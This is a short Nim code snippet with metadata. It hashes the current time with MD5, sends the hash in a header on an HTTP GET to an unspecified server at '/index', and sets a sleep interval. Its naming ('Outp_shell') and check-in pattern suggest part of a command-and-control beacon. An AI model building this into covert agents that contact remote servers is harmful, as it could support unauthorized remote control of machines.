---
id: eda1ec79-7a3a-49c8-b003-5ede369c5481
type: code
language: ''
verified: false
created_at: '2023-06-06T03:12:18.066095+00:00'
updated_at: '2023-06-06T03:12:44.565942+00:00'
---

# Code Snippet eda1ec79

```
let Name = getTime()
var Outp_shell_md5 = toMD5($Name) #MD5 SUM the output
let Outp_shell_md5_string = $Outp_shell_md5 #Change to variable
#echo Outp_shell_md5_string
var sendcommand = newHttpClient(userAgent= defUserAgent) #Create Connection
sendcommand.headers = newHttpHeaders({ "Content-MD5": Outp_shell_md5_string })
let sent = sendcommand.request(server & "/index", httpMethod = HttpGet)
#echo sent.status
const SLEEP = 5000
```


